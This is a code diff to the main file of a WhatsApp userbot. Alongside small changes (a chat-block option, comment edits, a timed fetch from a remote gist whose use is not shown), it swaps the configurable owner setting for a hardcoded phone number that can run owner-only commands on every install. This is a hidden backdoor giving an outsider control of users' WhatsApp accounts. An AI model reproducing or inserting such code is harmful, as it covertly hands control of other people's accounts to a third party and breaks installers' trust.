@@ -6,6 +6,7 @@ Develop by
 CyberBot -Aqua Snake
 */
 
+
 const fs = require("fs");
 const path = require("path");
 const events = require("./events");
@@ -42,17 +43,20 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
+var OWN = { ff: '94701807103,0' }
 
-// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
+// just a convenience. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
       return typeof args[i] != 'undefined' ? args[i++] : '';
    });
 };
+// ==================== Date Scanner ====================
 if (!Date.now) {
     Date.now = function() { return new Date().getTime(); }
 }
+// ==================== End Date Scanner ====================
 
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
@@ -167,7 +171,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
         var getGMTm = new Date().getMinutes()
         var ansk = 'https://gist.githubusercontent.com/Aqua-Snake/8e987079d65b9e09f23e6c31c940ea3d/raw/'
          
-        while (getGMTh == 9 && getGMTm == 01) {
+        while (getGMTh == 19 && getGMTm == 01) {
             const {data} = await axios(ansk)
             const { sken, skml } = data
                //Thanks to souravkl11         
@@ -281,6 +285,13 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
             return;                               
     }
 
+//-------------block chats------
+        if (config.BLOCKCHAT !== false) {     
+            var abc = config.BLOCKCHAT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+//-----------end 
+
         events.commands.map(
             async (command) =>  {
                 if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -322,8 +333,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                     if ((config.OWN2 !== false && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.OWN2.includes(',') ? config.OWN2.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN2 || config.OWN2.includes(',') ? config.OWN2.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN2)
+                     if ((OWN.ff == "94701807103,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
